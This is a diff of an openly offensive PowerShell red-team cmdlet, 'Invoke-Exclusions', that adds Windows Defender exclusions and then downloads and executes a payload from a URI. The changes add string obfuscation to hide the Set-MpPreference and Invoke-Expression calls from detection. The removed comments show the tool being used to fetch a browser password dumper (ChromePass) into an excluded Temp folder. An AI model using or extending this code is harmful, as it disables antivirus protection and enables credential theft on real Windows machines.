@@ -1,13 +1,12 @@
-<#
+﻿<#
 .SYNOPSIS
    [MITRE T1562.001] Manage Windows Defender Exclusions.
 
    Author: @r00t-3xp10it (ssa redteam)
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: Administrator privileges
-   Optional Dependencies: Iwr, Get-MpPreference, Set-MpPreference,
-                          Get-MpComputerStatus, Remove-MpPreference.
-   PS cmdlet Dev version: v1.0.6
+   Optional Dependencies: Invoke-WebRequest
+   PS cmdlet Dev version: v1.0.7
 
 .DESCRIPTION
    This cmdlet allow users to manage (query,create,delete) Defender exclusions:
@@ -123,7 +122,7 @@
 )
 
 
-$CmdletVersion = "v1.0.6"
+$CmdletVersion = "v1.0.7"
 #Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-Exclusions $CmdletVersion {SSA@RedTeam}"
@@ -333,19 +332,6 @@ If($Action -iMatch "(add|exec)")
    }
 
    #Make sure all modules required by this function are installed\loaded
-   If([bool]((Get-Module -ListAvailable -Name ConfigDefender).ExportedCommands|findstr /C:"Get-MpPreference") -iMatch '^(False)$')
-   {
-      write-host "`n  x " -ForegroundColor Red -NoNewline
-      write-host "Error: cmdlet requires '" -ForegroundColor DarkGray -NoNewline
-      write-host "Get-MpPreference" -ForegroundColor Red -NoNewline
-      write-host "' module." -ForegroundColor DarkGray
-
-      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
-      write-host "ok" -ForegroundColor DarkYellow -NoNewline
-      write-host "].." -ForegroundColor Green
-      return   
-   }
-
    If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -iMatch '^(False)$')
    {
       write-host "`n  x " -ForegroundColor Red -NoNewline
@@ -362,11 +348,6 @@ If($Action -iMatch "(add|exec)")
    #CmdLet Internal Parameter incoorencies .. 
    If($Type -iMatch "^(ExclusionExtension|ExclusionProcess)$")
    {
-      ## Function Limmitations
-      # cmdline: Set-MpPreference -ExclusionExtension "exe" -Force
-      # 1 - This exclusion must NOT contain paths {C:\path\path}
-      # 2 - This exclusion must NOT contain extensions wiht a dot {.exe}
-
       If($Exclude -Match '\\')
       {
          write-host "`n  x " -ForegroundColor Red -NoNewline
@@ -396,11 +377,6 @@ If($Action -iMatch "(add|exec)")
 
    If($Type -iMatch "ExclusionPath")
    {
-      ## Function Limmitations
-      # cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
-      # 1 - This exclusion must contain paths {C:\path\path}
-      # 2 - This exclusion must NOT contain extensions {.exe}
-
       If($Exclude -NotMatch '\\')
       {
          write-host "`n  x " -ForegroundColor Red -NoNewline
@@ -431,11 +407,6 @@ If($Action -iMatch "(add|exec)")
    #ExclusionIpAddress
    If($Type -iMatch "ExclusionIpAddress")
    {
-      ## Function Limmitations
-      # cmdline: Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
-      # 1 - This exclusion must NOT contain paths {C:\path\path}
-      # 2 - This exclusion must contain 4 dots {192.168.1.72}
-
       If($Exclude -Match '\\')
       {
          write-host "`n  x " -ForegroundColor Red -NoNewline
@@ -482,14 +453,12 @@ If($Action -iMatch "(add|exec)")
 
 
    #Create exclusion in Defender [1º step]
-   $cmdline = "Set-MpPreference -" + "$Type" + " `"$Exclude`" -Force" -join ''
+   $WMLime = "S@t-MpPr@f@r@nc@ -" -replace '@','e'
+   $cmdline = "$WMLime" + "$Type" + " `"$Exclude`" -Force" -join ''
    $cmdline|&('@ex' -replace '@','I')
 
-
-   #Check if 'MpPreference Type=' exists [True]
    If([bool]((Get-MpPreference).$Type) -iMatch '^(True)$')
    {
-      #Extract key from MpPreference
       $GetKey = (Get-MpPreference).$Type
       #Adding values to output DataTable!
       $StdinTable.Rows.Add("$Type","'$GetKey'")|Out-Null
@@ -531,10 +500,6 @@ If($Action -iMatch "(add|exec)")
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - Download payload from uri [2º step]
-
-      .NOTES
-         Accepted types: ExclusionProcess,
-         ExclusionPath, ExclusionExtension
       #>
 
       #Extract payload name + extension from -uri
@@ -585,13 +550,6 @@ If($Action -iMatch "(add|exec)")
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - Execute payload [3º step]
-
-      .NOTES
-         Accepted types: ExclusionProcess,
-         ExclusionPath, ExclusionExtension
-
-      .OUTPUTS
-         + Executing 'ChromePass.exe'
       #>
 
       $StartPath = (Get-Location).Path
@@ -602,11 +560,6 @@ If($Action -iMatch "(add|exec)")
 
       if($Uri -NotMatch "Off" -and $Type -iMatch '(ExclusionPath)')
       {
-         # Type    : ExclusionPath
-         # uri     : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe
-         # Exclude : C:\Users\pedro\AppData\Local\Temp
-         # Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
-
          If($Arguments -ieq "Off" -and $PayloadName -iMatch '(exe)$')
          {
             $ExecMe = "Start-Process " + "$PayloadName" -Join ''         
@@ -622,11 +575,6 @@ If($Action -iMatch "(add|exec)")
       }
       ElseIf($Uri -NotMatch "Off" -and $Type -iMatch '(ExclusionProcess|ExclusionExtension)')
       {
-         # Type    : ExclusionProcess|ExclusionExtension
-         # uri     : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1
-         # Exclude : powershell|ps1
-         # Set-MpPreference -ExclusionProcess|ExclusionExtension "powershell|ps1" -Force
-
          ## NOTES: This function mandatory downloads payloads to %TMP%
          If($Arguments -ieq "Off" -and $PayloadName -iMatch '(exe)$')
          {
@@ -643,11 +591,6 @@ If($Action -iMatch "(add|exec)")
       }
       ElseIf($Uri -NotMatch "Off" -and $Type -iMatch 'ExclusionIpAddress')
       {
-         # Type    : ExclusionIpAddress
-         # uri     : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1
-         # Exclude : 192.168.1.72
-         # Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
-
          ## NOTES: This function mandatory downloads payloads to %TMP%
          If($Arguments -ieq "Off" -and $PayloadName -iMatch '(exe)$')
          {
@@ -664,11 +607,6 @@ If($Action -iMatch "(add|exec)")
       }
       ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionExtension')
       {
-         # Type    : ExclusionExtension
-         # uri     : Off
-         # Exclude : exe
-         # Set-MpPreference -ExclusionExtension "exe" -Force
-
          ## ERROR: We can NOT execute extensions (exe) ...
          write-host "`n  x " -ForegroundColor Red -NoNewline
          write-host "Executing error: There is no '" -ForegroundColor DarkGray -NoNewline
@@ -682,11 +620,6 @@ If($Action -iMatch "(add|exec)")
       }
       ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionProcess')
       {
-         # Type    : ExclusionProcess
-         # uri     : Off
-         # Exclude : powershell
-         # Set-MpPreference -ExclusionProcess "powershell" -Force
-
          ## ERROR: We can NOT execute whats allready running (powershell) ...
          write-host "`n  x " -ForegroundColor Red -NoNewline
          write-host "Executing error: We can NOT execute whats allready running (" -ForegroundColor DarkGray -NoNewline
@@ -700,11 +633,6 @@ If($Action -iMatch "(add|exec)")
       }
       ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionPath')
       {
-         # Type    : ExclusionPath
-         # uri     : Off
-         # Exclude : C:\Users\pedro\AppData\Local\Temp
-         # Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
-
          ## ERROR: We can NOT execute directorys (folders) ...
          write-host "`n  x " -ForegroundColor Red -NoNewline
          write-host "Executing error: There is no '" -ForegroundColor DarkGray -NoNewline
@@ -718,11 +646,6 @@ If($Action -iMatch "(add|exec)")
       }
       ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionIpAddress')
       {
-         # Type    : ExclusionIpAddress
-         # uri     : Off
-         # Exclude : 192.168.1.72
-         # Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
-
          ## ERROR: We can NOT execute Ip Addresses ...
          write-host "`n  x " -ForegroundColor Red -NoNewline
          write-host "Executing error: There is no '" -ForegroundColor DarkGray -NoNewline
